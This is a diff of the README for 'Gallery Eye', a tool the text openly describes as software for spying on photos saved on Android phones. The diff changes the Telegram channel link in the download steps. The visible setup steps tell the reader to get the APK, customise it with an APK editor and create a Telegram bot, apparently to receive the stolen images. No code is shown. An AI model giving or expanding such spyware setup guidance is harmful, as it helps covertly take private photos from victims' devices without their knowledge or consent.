@@ -13,9 +13,9 @@ Gallery Eye is a software for spying on Android saved photos, after installing G
 
 ## Setup
 #### 1 - Download Gallery Eye APK
-Download Gallery Eye APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/AbyssalArmy).
+Download Gallery Eye APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/Bot_Hacking_Tips).
 #### 2 - Downlaod Apk Editor
-Download the APK Editor to customize the Gallery Eye application, you can download Apk Editor from our [Telegram channel](https://t.me/AbyssalArmy).
+Download the APK Editor to customize the Gallery Eye application, you can download Apk Editor from our [Telegram channel](https://t.me/Bot_Hacking_Tips).
 #### 3 - Create Telegram bot
 find Bot Father on Telegram by search on search bar or use this link : [@BotFather](https://t.me/BotFather)
 
